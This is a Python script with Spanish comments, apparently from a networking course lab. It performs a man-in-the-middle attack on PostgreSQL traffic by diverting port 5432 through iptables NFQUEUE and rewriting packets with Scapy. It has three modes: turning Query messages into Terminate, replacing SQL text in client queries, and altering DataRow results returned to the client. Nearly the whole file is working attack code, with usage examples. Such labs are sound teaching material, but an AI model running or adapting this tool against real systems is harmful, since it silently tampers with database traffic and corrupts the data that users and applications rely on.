#!/usr/bin/env python3
"""
mitm_postgres.py
----------------
MODIFICACION EN TIEMPO REAL del trafico PostgreSQL (ataque Man-in-the-Middle)
usando NetfilterQueue + Scapy.

Se ejecuta en el contenedor 'scapy_mitm', que comparte la pila de red del
servidor (network_mode: "service:postgres_server"). El script instala dos
reglas de iptables que desvian el trafico del puerto 5432 hacia una cola
NFQUEUE; cada paquete se entrega a Python, se reescribe con Scapy, se
recalculan los checksums y se reinyecta.

Modos (variable de entorno MITM_MODE):

  tipo     -> Modificacion 1. Cambia el byte de TIPO de un mensaje Query
              ('Q' = 0x51) por otro byte (por defecto 'X' = 0x58 = Terminate).
              Direccion: Cliente -> Servidor.   [valida el Caso A de Tarea 2]

  sql      -> Modificacion 2. Reemplaza una subcadena del TEXTO SQL de un
              mensaje Query por otra de IGUAL longitud (OLD -> NEW).
              Direccion: Cliente -> Servidor.

  datarow  -> Modificacion 3. Reemplaza bytes dentro de un mensaje DataRow
              ('D') que viaja del servidor al cliente, por otros de IGUAL
              longitud (OLD -> NEW).
              Direccion: Servidor -> Cliente.   [valida el Caso B de Tarea 2]

REGLA DE ORO: solo se permiten sustituciones de IGUAL longitud. Si se
cambiara la longitud del payload TCP se romperia la numeracion de secuencia
del flujo y el campo de longitud del mensaje del protocolo, cortando la
conexion en lugar de modificarla de forma transparente.

Ejemplos de uso (dentro de scapy_mitm):
    MITM_MODE=tipo    python3 mitm_postgres.py
    MITM_MODE=sql  OLD=tareas NEW=xareas        python3 mitm_postgres.py
    MITM_MODE=datarow OLD="Taller de Redes" NEW="HACKED de Redes" python3 mitm_postgres.py
"""
import os
import signal
import subprocess
import sys

from scapy.all import IP, TCP, Raw
from netfilterqueue import NetfilterQueue

MODE = os.environ.get("MITM_MODE", "tipo").lower()
QUEUE_NUM = int(os.environ.get("QUEUE", "1"))
PG_PORT = int(os.environ.get("PG_PORT", "5432"))

OLD = os.environ.get("OLD", "tareas").encode()
NEW = os.environ.get("NEW", "xareas").encode()
TYPE_FROM = os.environ.get("TYPE_FROM", "Q").encode()[:1]
TYPE_TO = os.environ.get("TYPE_TO", "X").encode()[:1]

# Reglas iptables: desviar ambas direcciones del puerto 5432 a la cola NFQUEUE
_RULES = [
    ["INPUT",  "--dport", str(PG_PORT)],   # Cliente -> Servidor
    ["OUTPUT", "--sport", str(PG_PORT)],   # Servidor -> Cliente
]


def _iptables(action):
    for chain, flag, port in _RULES:
        subprocess.run(
            ["iptables", action, chain, "-p", "tcp", flag, port,
             "-j", "NFQUEUE", "--queue-num", str(QUEUE_NUM)],
            check=(action == "-I"),
        )


def add_rules():
    _iptables("-I")


def del_rules():
    _iptables("-D")


def modificar(paquete):
    """Callback de NFQUEUE: reescribe el paquete si corresponde."""
    ip = IP(paquete.get_payload())
    if not (ip.haslayer(TCP) and ip.haslayer(Raw)):
        paquete.accept()
        return

    tcp = ip[TCP]
    raw = bytes(ip[Raw].load)
    nuevo = raw
    cliente_a_servidor = (tcp.dport == PG_PORT)
    servidor_a_cliente = (tcp.sport == PG_PORT)

    # ---- Modificacion 1: byte de tipo del mensaje Query --------------------
    if MODE == "tipo" and cliente_a_servidor and raw[:1] == TYPE_FROM:
        nuevo = TYPE_TO + raw[1:]
        print(f"[tipo] Query: byte de tipo {TYPE_FROM!r} -> {TYPE_TO!r}  "
              f"(payload: {raw[:40]!r})")

    # ---- Modificacion 2: texto SQL del mensaje Query -----------------------
    elif (MODE == "sql" and cliente_a_servidor and raw[:1] == b"Q"
          and OLD in raw and len(OLD) == len(NEW)):
        nuevo = raw.replace(OLD, NEW)
        print(f"[sql] '{OLD.decode(errors='replace')}' -> "
              f"'{NEW.decode(errors='replace')}'  (payload: {raw[:60]!r})")

    # ---- Modificacion 3: payload de un DataRow del servidor ----------------
    elif (MODE == "datarow" and servidor_a_cliente
          and OLD in raw and len(OLD) == len(NEW)):
        nuevo = raw.replace(OLD, NEW)
        print(f"[datarow] '{OLD.decode(errors='replace')}' -> "
              f"'{NEW.decode(errors='replace')}'  (payload: {raw[:60]!r})")

    if nuevo != raw:
        ip[Raw].load = nuevo
        # Forzar el recalculo de longitudes y checksums (igual longitud -> ok)
        del ip[IP].len
        del ip[IP].chksum
        del ip[TCP].chksum
        paquete.set_payload(bytes(ip))

    paquete.accept()


def main():
    if MODE not in ("tipo", "sql", "datarow"):
        sys.exit(f"MITM_MODE invalido: {MODE!r}. Use tipo | sql | datarow.")
    if MODE in ("sql", "datarow") and len(OLD) != len(NEW):
        sys.exit(f"OLD y NEW deben tener IGUAL longitud "
                 f"({len(OLD)} != {len(NEW)}).")

    print(f"== MITM PostgreSQL ==  modo={MODE}  cola={QUEUE_NUM}  puerto={PG_PORT}")
    print("Instalando reglas iptables -> NFQUEUE ...")
    add_rules()

    nfq = NetfilterQueue()
    nfq.bind(QUEUE_NUM, modificar)

    def limpiar(*_):
        print("\nRetirando reglas iptables y cerrando ...")
        try:
            nfq.unbind()
        except Exception:
            pass
        del_rules()
        sys.exit(0)

    signal.signal(signal.SIGINT, limpiar)
    signal.signal(signal.SIGTERM, limpiar)

    print("Interceptando. Genere trafico desde psql_client. (Ctrl+C para terminar)")
    try:
        nfq.run()
    finally:
        del_rules()


if __name__ == "__main__":
    main()
